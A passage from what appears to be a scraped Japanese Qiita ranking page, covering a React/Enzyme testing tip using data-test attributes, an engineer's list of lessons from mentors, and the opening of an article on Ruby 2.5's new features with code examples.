<span id="-うちはjs用のclass名の命名規則があるのでデザインを変えてもそのclass名は変わらない" class="fragment"></span><a href="#-%E3%81%86%E3%81%A1%E3%81%AFjs%E7%94%A8%E3%81%AEclass%E5%90%8D%E3%81%AE%E5%91%BD%E5%90%8D%E8%A6%8F%E5%89%87%E3%81%8C%E3%81%82%E3%82%8B%E3%81%AE%E3%81%A7%E3%83%87%E3%82%B6%E3%82%A4%E3%83%B3%E3%82%92%E5%A4%89%E3%81%88%E3%81%A6%E3%82%82%E3%81%9D%E3%81%AEclass%E5%90%8D%E3%81%AF%E5%A4%89%E3%82%8F%E3%82%89%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>🤔 うちはjs用のclass名の命名規則があるので、デザインを変えてもそのclass名は変わらない</h3>

<p>チームで共通のルールがあれば、それでよいと思います。<s>ただ、もしご覧になっていたらコメントして頂きたいのですが、プロダクションではそのクラス名は残していますか？</s></p>

<p>取り除くためのプラグインを作りました🎉</p>

<p><a href="https://qiita.com/akameco/items/c540693df312a4274791" id="reference-ee3231d5a8498ad3f2ab"><strong>テストのためのクラス名をプロダクションビルドで除去する</strong></a></p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">hello</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">(</span>
    <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">className</span><span class="o">=</span><span class="s2">"test-a hello test-b"</span><span class="o">&gt;</span><span class="nx">hello</span><span class="o">&lt;</span><span class="err">/div&gt;</span>
<span class="p">)</span>

      <span class="err">↓</span> <span class="err">↓</span> <span class="err">↓</span> <span class="err">↓</span> <span class="err">↓</span> <span class="err">↓</span>

<span class="kr">const</span> <span class="nx">hello</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">(</span>
    <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">className</span><span class="o">=</span><span class="s2">"hello"</span><span class="o">&gt;</span><span class="nx">hello</span><span class="o">&lt;</span><span class="err">/div&gt;;</span>
<span class="p">)</span>
</pre></div></div>

<h3>
<span id="-テスト書いてない" class="fragment"></span><a href="#-%E3%83%86%E3%82%B9%E3%83%88%E6%9B%B8%E3%81%84%E3%81%A6%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>😇 テスト書いてない</h3>

<p><a href="https://camo.qiitausercontent.com/6bdb9c4f5b13c0243ba67aba901bad7cb0362dd2/68747470733a2f2f636f6e6e706173732d746f6b796f2e73332e616d617a6f6e6177732e636f6d2f6576656e742f32373534302f34316438346366306536343934653265393165353161643865396338353331302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/6bdb9c4f5b13c0243ba67aba901bad7cb0362dd2/68747470733a2f2f636f6e6e706173732d746f6b796f2e73332e616d617a6f6e6177732e636f6d2f6576656e742f32373534302f34316438346366306536343934653265393165353161643865396338353331302e706e67"></a></p>

<h2>
<span id="α-デモ" class="fragment"></span><a href="#%CE%B1-%E3%83%87%E3%83%A2"><i class="fa fa-link"></i></a>+α デモ</h2>

<p>ちょっとコードが少なすぎた感じがあるので、入力後、エンターが押されたら画面に反映するデモのテストを簡単に用意しました。テスト対象に、<code>data-test</code>を書くのでDOMの構造が変わってもテストは変わりません。ええ、<code>h2</code>を<code>h3</code>にしても、<code>&lt;Title/&gt;</code>というコンポーネントに切り出しても、他の<code>div</code>でラップしても<code>CSSinJS</code>にしても変わることはないのです。また、<code>changeInputValue</code>などのいくつかのユーティリティをいくつか用意してあげるとわかりやすくてよいです。</p>

<p><a href="https://gyazo.com/32196226db3a69d9aff0921b3105cc69" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/a3d2cc6032b6126c04388fb2df01e2afbffe5a6f/68747470733a2f2f692e6779617a6f2e636f6d2f33323139363232366462336136396439616666303932316233313035636336392e676966" alt="https://gyazo.com/32196226db3a69d9aff0921b3105cc69" data-canonical-src="https://i.gyazo.com/32196226db3a69d9aff0921b3105cc69.gif"></a></p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span>      <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="nx">h2</span> <span class="nx">data</span><span class="o">-</span><span class="nx">test</span><span class="o">=</span><span class="s2">"title"</span><span class="o">&gt;</span><span class="nx">Welcome</span> <span class="nx">to</span> <span class="p">{</span><span class="nx">title</span><span class="p">}.</span><span class="nx">js</span><span class="o">!&lt;</span><span class="err">/h2&gt;</span>
        <span class="o">&lt;</span><span class="nx">form</span> <span class="nx">onSubmit</span><span class="o">=</span><span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">handleSubmit</span><span class="p">)}</span><span class="o">&gt;</span>
          <span class="o">&lt;</span><span class="nx">fieldset</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="nx">input</span>
              <span class="nx">data</span><span class="o">-</span><span class="nx">test</span><span class="o">=</span><span class="s2">"name"</span>
              <span class="nx">placeholder</span><span class="o">=</span><span class="s2">"name"</span>
              <span class="nx">type</span><span class="o">=</span><span class="s2">"text"</span>
              <span class="nx">value</span><span class="o">=</span><span class="p">{</span><span class="nx">name</span><span class="p">}</span>
              <span class="nx">onChange</span><span class="o">=</span><span class="p">{</span><span class="nx">e</span> <span class="o">=&gt;</span> <span class="k">this</span><span class="p">.</span><span class="nx">setState</span><span class="p">({</span> <span class="nx">name</span><span class="o">:</span> <span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">value</span> <span class="p">})}</span>
              <span class="nx">onKeyUp</span><span class="o">=</span><span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">watchForEnter</span><span class="p">}</span>
            <span class="o">/&gt;</span>
          <span class="o">&lt;</span><span class="err">/fieldset&gt;</span>
        <span class="o">&lt;</span><span class="err">/form&gt;</span>
      <span class="o">&lt;</span><span class="err">/div&gt;</span>
</pre></div></div>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kr">import</span> <span class="o">*</span> <span class="nx">as</span> <span class="nx">React</span> <span class="nx">from</span> <span class="s1">'react'</span>
<span class="kr">import</span> <span class="p">{</span> <span class="nx">mount</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">'enzyme'</span>
<span class="kr">import</span> <span class="nx">Component</span> <span class="nx">from</span> <span class="s1">'.'</span>

<span class="kd">function</span> <span class="nx">sel</span><span class="p">(</span><span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">return</span> <span class="sb">`[data-test="</span><span class="si">${</span><span class="nx">id</span><span class="si">}</span><span class="sb">"]`</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">changeInputValue</span><span class="p">(</span><span class="nx">input</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">input</span><span class="p">.</span><span class="nx">simulate</span><span class="p">(</span><span class="s1">'change'</span><span class="p">,</span> <span class="p">{</span> <span class="nx">target</span><span class="o">:</span> <span class="p">{</span> <span class="nx">value</span> <span class="p">}</span> <span class="p">})</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">keyUpInput</span><span class="p">(</span><span class="nx">input</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">input</span><span class="p">.</span><span class="nx">simulate</span><span class="p">(</span><span class="s1">'keyup'</span><span class="p">,</span> <span class="p">{</span> <span class="nx">key</span> <span class="p">})</span>
<span class="p">}</span>

<span class="nx">test</span><span class="p">(</span><span class="s1">'エンターが押されたとき、nameフィールドに入力された文字列をタイトルに設定する'</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kr">const</span> <span class="nx">wrapper</span> <span class="o">=</span> <span class="nx">mount</span><span class="p">(</span><span class="o">&lt;</span><span class="nx">Component</span> <span class="o">/&gt;</span><span class="p">)</span>
  <span class="kr">const</span> <span class="nx">nameField</span> <span class="o">=</span> <span class="nx">wrapper</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="nx">sel</span><span class="p">(</span><span class="s1">'name'</span><span class="p">))</span>
  <span class="nx">changeInputValue</span><span class="p">(</span><span class="nx">nameField</span><span class="p">,</span> <span class="s1">'無職'</span><span class="p">)</span>
  <span class="nx">keyUpInput</span><span class="p">(</span><span class="nx">nameField</span><span class="p">,</span> <span class="s1">'Enter'</span><span class="p">)</span>
  <span class="nx">expect</span><span class="p">(</span><span class="nx">wrapper</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="nx">sel</span><span class="p">(</span><span class="s1">'title'</span><span class="p">)).</span><span class="nx">text</span><span class="p">()).</span><span class="nx">toBe</span><span class="p">(</span><span class="s1">'Welcome to 無職.js!'</span><span class="p">)</span>
<span class="p">})</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">63位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>163</kbd>
		<a target="_blank" href="https://qiita.com/TsuyoshiUshio@github/items/b9ae6e3a4ee63da66cd1">技術師匠の皆様の教えを記録する</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-11<br />09:19:02</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/3470.html">TsuyoshiUshio@github</a>(124件の記事)<br />(Simplearchitect 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/3470/profile-images/1473683187">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[ベストプラクティス]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>私には何名かの師匠がいる。私は技術力は３流なので、ちゃんとしたプログラマになりたい。だから、イケてる人をみると教えを得るようにしている。見返すことができるように、その内容をまとめておく。</p>

<h1>
<span id="1-小さなハローワールドを繰り返しブログに記録する" class="fragment"></span><a href="#1-%E5%B0%8F%E3%81%95%E3%81%AA%E3%83%8F%E3%83%AD%E3%83%BC%E3%83%AF%E3%83%BC%E3%83%AB%E3%83%89%E3%82%92%E7%B9%B0%E3%82%8A%E8%BF%94%E3%81%97%E3%83%96%E3%83%AD%E3%82%B0%E3%81%AB%E8%A8%98%E9%8C%B2%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>1. 小さなハローワールドを繰り返し、ブログに記録する</h1>

<p>私のNo.1 師匠である、かずきさんから教えてもらったこと。彼と Hackfest に参加した時に、APIリファレンスを見ることなく、APIの中身のアーキテクチャまで理解していながら、高速に開発する姿は最高だった。一方私は、何しても人の三倍かかって、しょっちゅう Google のお世話になっている。</p>

<p>彼に教えてもらったことが、このことで、「小さなハローワールド」を繰り返すということだ。何か新しいこと、に出会ったら、難しいことをしなくていいので、自分の手の届くような小さなハローワールドレベルのプログラムを書く。その時に重要なのは、ドキュメントにあるコードをそのままではなく、自分なりに少し変えて作る。そしてそれをブログに書く。</p>

<p>コードを変えるのは、やっぱり自分でできるようになっているかすることもあるだろうし、ブログに書く時に、他人に説明する程で書くのがいい。自分で理解できていないことがその時にわかる。他の人のためにブログを書いているわけではないので、アクセスとかは気にしなくていいが、「他の人が理解」できるように書くことで、理解を深めて、自分にも記憶に残りやすくなる。また忘れた時も便利。</p>

<p>これを実践している時に感じたポイントは、「問題を小さく分ける」ということ。結構難しいが、複数のことが絡み合うから、ややこしい。だから、同時に試す要素は１要素にする。そのために、面倒でも、新しいプロジェクトを作ると良い。人間は難しいことを一気に解決できない。こうしたハローワールドを繰り返しているといつしか高いところにいることに気づくとのこと。このメソッドは相当強力であると感じている。</p>

<p><a href="https://camo.qiitausercontent.com/82ac0950ec2d9f40e7715dff946b2d8f1b6cdc29/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f333437302f33626236396366362d333538302d356636322d636632622d3265323163643364326336372e706e67" target="_blank" rel="nofollow noopener"><img width="889" alt="Screen Shot 2017-11-11 at 10.24.05 AM.png" src="https://camo.qiitausercontent.com/82ac0950ec2d9f40e7715dff946b2d8f1b6cdc29/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f333437302f33626236396366362d333538302d356636322d636632622d3265323163643364326336372e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/3470/3bb69cf6-3580-5f62-cf2b-2e21cd3d2c67.png"></a></p>

<p>私のQiita のエントリがそれなのだが、いかに他の人にとってどうでもいい内容をブログにしているかわかるだろう。ポイントは、自分にとってわからないことか、そして、自分にとって小さなハローワールドかだ。だから、他の人にとって役に立つか、とか既知の情報であるかは気にしていない。</p>

<p>ちなみに、他の人に役立ちそうだなと思った時で、英語にも既存のリソースがなさげな時は英語で書いている。</p>

<p>*<a href="https://blogs.technet.microsoft.com/livedevopsinjapan/" rel="nofollow noopener" target="_blank">Live DevOps in Japan</a></p>

<h1>
<span id="2-コマンドを使ったらその前後で何が変わるかを理解する" class="fragment"></span><a href="#2-%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%9F%E3%82%89%E3%81%9D%E3%81%AE%E5%89%8D%E5%BE%8C%E3%81%A7%E4%BD%95%E3%81%8C%E5%A4%89%E3%82%8F%E3%82%8B%E3%81%8B%E3%82%92%E7%90%86%E8%A7%A3%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>2. コマンドを使ったらその前後で何が変わるかを理解する</h1>

<p>どんな技術でも使いこなし、とてつもなく学習が早く、衝撃的な Hack力を持つ Ken さんに教えてもらったこと。彼は、新しいコマンドを使うときは、なんとなく動いたとかではなくて、コマンドを使ったら前後で何が変化するか？を理解するという。diff みたいなものを使って、前後でどう状態が変化したかまでを理解すると良いとのこと。</p>

<h1>
<span id="3-ドキュメントを読む" class="fragment"></span><a href="#3-%E3%83%89%E3%82%AD%E3%83%A5%E3%83%A1%E3%83%B3%E3%83%88%E3%82%92%E8%AA%AD%E3%82%80"><i class="fa fa-link"></i></a>3. ドキュメントを読む</h1>

<p>Ken さん曰く、ドキュメントは、正しい、もしくは、過去正しかったことが書かれていることが基本なので、ここをしっかり読むことが重要という話だった。とても当たり前のように感じるが、最近英語のドキュメントを読むことが多いが、英語だと特に億劫になって、「多分こんな感じだろー」みたいな感じで飛ばし読みすることが多い。そうすると、読み飛ばしていたところに、注意事項が書いてあったりして無駄にどはまりしてしまったりも良くする。私の場合英語力がいまいちなのでそれでもミスることも多いが、まず焦らずドキュメントを読むところから始めている。</p>

<h1>
<span id="4-ジタバタしない" class="fragment"></span><a href="#4-%E3%82%B8%E3%82%BF%E3%83%90%E3%82%BF%E3%81%97%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>4. ジタバタしない</h1>

<p>同じく Ken さんのアドバイスで、何かに詰まったら、そこであーでもない、こーでもない、と試行錯誤しないということ。まずは、誰かに聞く（MLなど）そして、投げた後は他のことをする。確かにそっちの方が効率が良い。やはりジタバタの時間はいつも相当無駄になっている。</p>

<h1>
<span id="5-トリプルディスプレイを使う" class="fragment"></span><a href="#5-%E3%83%88%E3%83%AA%E3%83%97%E3%83%AB%E3%83%87%E3%82%A3%E3%82%B9%E3%83%97%E3%83%AC%E3%82%A4%E3%82%92%E4%BD%BF%E3%81%86"><i class="fa fa-link"></i></a>5. トリプルディスプレイを使う</h1>

<p>Ken さんに、ディスプレイ４つだと扱えない。３つが最高と聞いたので、実際やってみた。これは最高だ。持ち運び用のセカンドディスプレイも検討中。後、エディタのショートカットとか、terminal とかのコマンドは、時間をかけて覚えた方がいいとのこと。普段動作のものなので、生産性に効いてくるからとのこと。</p>

<h1>
<span id="6-arm-を愛でるコードを読む" class="fragment"></span><a href="#6-arm-%E3%82%92%E6%84%9B%E3%81%A7%E3%82%8B%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E8%AA%AD%E3%82%80"><i class="fa fa-link"></i></a>6. ARM を愛でる、コードを読む</h1>

<p>これはインフラ野郎、真壁さんの教え。彼に、なんでどこにもドキュメントに出ていないような情報を知れるのですか？と聞くと、疑問に思ったことは、MLで聞いてみたり、試しているみたい。Managed で背景は一瞬見えなさそうでも、どう動いているかを把握されようとしていた。また、AKS の仕組みの調査も、ARMを愛でたりしているらしい。それでビールが飲めるらしい。他にアーキテクチャ的な部分も、コードを読んで確かめている様子。彼から聞いたのではないが、疑問があったらほっておかずに、調べてみるのがいいのかもしれない。確かにどうしてもわからなければ、聞けば良いかも。</p>

<h1>
<span id="7-ビデオを見るアーキテクチャに時間を使う" class="fragment"></span><a href="#7-%E3%83%93%E3%83%87%E3%82%AA%E3%82%92%E8%A6%8B%E3%82%8B%E3%82%A2%E3%83%BC%E3%82%AD%E3%83%86%E3%82%AF%E3%83%81%E3%83%A3%E3%81%AB%E6%99%82%E9%96%93%E3%82%92%E4%BD%BF%E3%81%86"><i class="fa fa-link"></i></a>7. ビデオを見る、アーキテクチャに時間を使う</h1>

<p>同僚の超絶センスいい Kanio の言葉。コードを書いてばかりではなく、アーキテクチャにも時間を使うのが重要らしい。なぜ、そんなインターナルを知っているのか聞くと、ビデオをみたり、わからないところを質問したりしているとこのこと。コードと、アーキテクチャのバランスを取るのが必要らしい。そういえば私はコードばかりで、こちらの方はやっていなかったので、もう少しこちらもやってみる。</p>

<h1>
<span id="8-わからないところは質問する" class="fragment"></span><a href="#8-%E3%82%8F%E3%81%8B%E3%82%89%E3%81%AA%E3%81%84%E3%81%A8%E3%81%93%E3%82%8D%E3%81%AF%E8%B3%AA%E5%95%8F%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>8. わからないところは質問する</h1>

<p>達人から複数いただいた回答で、インターナルの様子など、わからない時は、質問する。確かに単純だけど、ドキュメントなかったら諦めてしまっていた。やってみる。</p>

<h1>
<span id="9-マイクロソフト内で検索する" class="fragment"></span><a href="#9-%E3%83%9E%E3%82%A4%E3%82%AF%E3%83%AD%E3%82%BD%E3%83%95%E3%83%88%E5%86%85%E3%81%A7%E6%A4%9C%E7%B4%A2%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>9. マイクロソフト内で検索する</h1>

<p>マイクロソフト内限定だけど、社内の検索サイトで検索すると色々情報が落ちているらしい。それを読んでみる。</p>

<h1>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h1>

<p>このブログも自分のためにまとめてみた。今後こっそりアップデートされるかも。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">64位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>163</kbd>
		<a target="_blank" href="https://qiita.com/jnchito/items/f182b6f0093a6a3701a1">サンプルコードでわかる！Ruby 2.5の主な新機能と変更点</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-10<br />08:22:48</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/7465.html">jnchito</a>(165件の記事)<br />(SonicGarden Inc. 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/7465/profile-images/1500323590">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Ruby]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h2>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h2>

<p>Rubyは毎年12月25日にアップデートされます。<br>
<s>今年はまだpreview版がリリースされていませんが（2017年10月10日時点）、今年もそろそろリリースの日が近づいてきました。</s><br>
Ruby 2.5については2017年10月10日にpreview1がリリースされました。</p>

<p><a href="https://www.ruby-lang.org/en/news/2017/10/10/ruby-2-5-0-preview1-released/" rel="nofollow noopener" target="_blank">Ruby 2.5.0-preview1 Released</a></p>

<p>そこでこの記事ではこの2.5.0-preview1を参考にして、おそらくこんな感じでリリースされるであろうRuby 2.5の新機能や変更点をまとめてみました。</p>

<h3>
<span id="本記事の情報源" class="fragment"></span><a href="#%E6%9C%AC%E8%A8%98%E4%BA%8B%E3%81%AE%E6%83%85%E5%A0%B1%E6%BA%90"><i class="fa fa-link"></i></a>本記事の情報源</h3>

<p>本記事は以下のNEWSページに掲載されている情報から、個人的に注目したい新機能をピックアップしたものです。</p>

<p><a href="https://github.com/ruby/ruby/blob/6c29f232a733228507a39fbc9f30b89ee960b165/NEWS" rel="nofollow noopener" target="_blank">NEWS（commit: 6c29f23）</a></p>

<p>この記事に掲載していない変更点もあるので、詳細はNEWSページをご覧ください。</p>

<p>また、説明している内容に間違いがあれば、コメントや編集リクエスト等で優しく指摘してやってください。<br>
ここで紹介していない新機能に関する編集リクエストも大歓迎です！</p>

<h3>
<span id="動作確認したrubyのバージョン" class="fragment"></span><a href="#%E5%8B%95%E4%BD%9C%E7%A2%BA%E8%AA%8D%E3%81%97%E3%81%9Fruby%E3%81%AE%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a>動作確認したRubyのバージョン</h3>

<p>本記事は以下の環境で実行した結果を記載しています。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ ruby -v
ruby 2.5.0preview1 (2017-10-10 trunk 60153) [x86_64-darwin16]
</pre></div></div>

<h3>
<span id="コード例" class="fragment"></span><a href="#%E3%82%B3%E3%83%BC%E3%83%89%E4%BE%8B"><i class="fa fa-link"></i></a>コード例</h3>

<p>本記事のコード例は以下のGitHubリポジトリに置いています。</p>

<p><a href="https://github.com/JunichiIto/ruby-2-5-sandbox" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/JunichiIto/ruby-2-5-sandbox</a></p>

<p>それでは以下が本編です！</p>

<h2>
<span id="言語仕様上の変更点" class="fragment"></span><a href="#%E8%A8%80%E8%AA%9E%E4%BB%95%E6%A7%98%E4%B8%8A%E3%81%AE%E5%A4%89%E6%9B%B4%E7%82%B9"><i class="fa fa-link"></i></a>言語仕様上の変更点</h2>

<h3>
<span id="doendブロック内でbeginendなしのrescueelseensureが書けるようになった" class="fragment"></span><a href="#doend%E3%83%96%E3%83%AD%E3%83%83%E3%82%AF%E5%86%85%E3%81%A7beginend%E3%81%AA%E3%81%97%E3%81%AErescueelseensure%E3%81%8C%E6%9B%B8%E3%81%91%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%9F"><i class="fa fa-link"></i></a>do/endブロック内でbegin/endなしのrescue/else/ensureが書けるようになった</h3>

<p>Ruby2.5ではブロック内でbegin/endなしのrescue/else/ensureが書けるようになりました。<br>
これによりネストの深さと行数を節約できます。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="c1"># Ruby 2.4</span>
<span class="o">[</span><span class="mi">1</span><span class="o">].</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">n</span><span class="o">|</span>
  <span class="k">begin</span>
    <span class="n">n</span> <span class="o">/</span> <span class="mi">0</span>
  <span class="k">rescue</span>
    <span class="c1"># rescue</span>
  <span class="k">else</span>
    <span class="c1"># else</span>
  <span class="k">ensure</span>
    <span class="c1"># ensure</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="c1"># Ruby 2.5</span>
<span class="o">[</span><span class="mi">1</span><span class="o">].</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">n</span><span class="o">|</span>
  <span class="n">n</span> <span class="o">/</span> <span class="mi">0</span>
<span class="k">rescue</span>
  <span class="c1"># rescue</span>
<span class="k">else</span>
  <span class="c1"># else</span>
<span class="k">ensure</span>
  <span class="c1"># ensure</span>
<span class="k">end</span>
</pre></div></div>

<p>ただし、ブロックを<code>{}</code>で書いた場合は構文エラーになります。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="o">[</span><span class="mi">1</span><span class="o">].</span><span class="n">each</span> <span class="p">{</span> <span class="o">|</span><span class="n">n</span><span class="o">|</span>
  <span class="n">n</span> <span class="o">/</span> <span class="mi">0</span>
<span class="k">rescue</span>
  <span class="c1"># rescue</span>
<span class="k">else</span>
  <span class="c1"># else</span>
<span class="k">ensure</span>
  <span class="c1"># ensure</span>
<span class="p">}</span>
<span class="c1">#=&gt; SyntaxError: (irb):3: syntax error, unexpected keyword_rescue, expecting '}'</span>
<span class="c1">#     rescue</span>
<span class="c1">#     ^~~~~~</span>
</pre></div></div>

<p>do/endと{}で挙動が変わるの？と思ってしまったんですが、むしろ{}を除外することで提案が通ったそうです。</p>

<blockquote class="twitter-tweet">
<p>今までも何回か提案されていたけれど、{…rescue…}の違和感からrejectされ続けてきたモノなので、むしろ{}を除外したというのが今回通ったポイント <a href="https://t.co/eDNlrtlUwE" rel="nofollow noopener" target="_blank">https://t.co/eDNlrtlUwE</a></p>— †ꁐ𐨥ᐠ†-̱̏ (@n0kada) <a href="https://twitter.com/n0kada/status/894714200148262912?ref_src=twsrc%5Etfw" rel="nofollow noopener" target="_blank">August 8, 2017</a>
</blockquote>



<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/12906" rel="nofollow noopener" target="_blank">Feature #12906: do/end blocks work with ensure/rescue/else</a>
</li>
</ul>

<h3>
<span id="トップレベルの定数探索のルールが変更された" class="fragment"></span><a href="#%E3%83%88%E3%83%83%E3%83%97%E3%83%AC%E3%83%99%E3%83%AB%E3%81%AE%E5%AE%9A%E6%95%B0%E6%8E%A2%E7%B4%A2%E3%81%AE%E3%83%AB%E3%83%BC%E3%83%AB%E3%81%8C%E5%A4%89%E6%9B%B4%E3%81%95%E3%82%8C%E3%81%9F"><i class="fa fa-link"></i></a>トップレベルの定数探索のルールが変更された</h3>

<p>下のような3つのクラスがあったとします。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="c1"># Ruby 2.4</span>
<span class="k">class</span> <span class="nc">Item</span><span class="p">;</span> <span class="k">end</span>
<span class="k">class</span> <span class="nc">Staff</span><span class="p">;</span> <span class="k">end</span>
<span class="k">class</span> <span class="nc">ItemsController</span><span class="p">;</span> <span class="k">end</span>
</pre></div></div>

<p>さらにこの状態から、次のクラスを参照します。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="no">Staff</span><span class="o">::</span><span class="no">ItemsController</span>
</pre></div></div>

<p>ぱっと見、「こんなクラスは定義してないよ！」と思うかもしれませんが、Ruby 2.4では（警告付きで）ItemsControllerを参照したことになります。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="c1"># Ruby 2.4</span>
<span class="no">Staff</span><span class="o">::</span><span class="no">ItemsController</span>
<span class="c1">#=&gt; warning: toplevel constant ItemsController referenced by Staff::ItemsController</span>
<span class="c1">#=&gt; ItemsController</span>
</pre></div></div>

<p>なぜなら、トップレベルのクラス定義はObjectクラス以下にクラスが定義され、さらにRubyはStaffクラス、Objectクラスと順に継承関係をさかのぼってItemsControllerが定義されていないか探しに行っていたためです。</p>

<p>しかし、この仕様はプログラマが本来求めているものと異なるクラスが返される恐れがあり、わかりづらい不具合の原因になっていました。<br>
（<a href="https://qiita.com/jnchito/items/79aaca1c51a0ca20ba6e" id="reference-1d908de540387ce9d1bb">こちらの記事</a>で詳しく説明しています。）</p>

<p>そこでRuby 2.5では、継承関係をさかのぼらなくなりました（Staffクラス以下にItemsControllerが定義されていなければエラー）。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="c1"># Ruby 2.5</span>
<span class="no">Staff</span><span class="o">::</span><span class="no">ItemsController</span>
<span class="c1">#=&gt; NameError: uninitialized constant Staff::ItemsController</span>
<span class="c1">#   Did you mean?  ItemsController</span>
</pre></div></div>

<p>ItemsControllerを参照するためには、以下のいずれかの方法をとることになります（この書き方はいずれもRuby 2.4でも有効です）。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="no">ItemsController</span>
<span class="no">Object</span><span class="o">::</span><span class="no">ItemsController</span>
<span class="o">::</span><span class="no">ItemsController</span>
</pre></div></div>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/11547" rel="nofollow noopener" target="_blank">Feature #11547: remove top-level constant lookup</a>
</li>
</ul>

<h3>
